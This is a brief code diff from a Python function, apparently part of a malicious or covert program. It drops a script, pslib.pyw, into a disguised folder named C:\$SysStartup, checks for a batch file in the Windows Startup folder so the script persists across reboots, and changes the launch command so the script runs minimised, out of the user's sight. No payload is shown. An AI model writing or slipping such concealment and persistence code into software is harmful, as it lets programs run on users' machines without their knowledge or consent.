@@ -87,7 +87,7 @@ def libInit():
             lib.write(var)
 
         call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
-        call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
+        call(["start", "/min", "cmd", "/c", "python C:\\$SysStartup\\pslib.pyw"], shell=True)
 
     if not exists(
             f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$SysStartup\\pslib.pyw"):
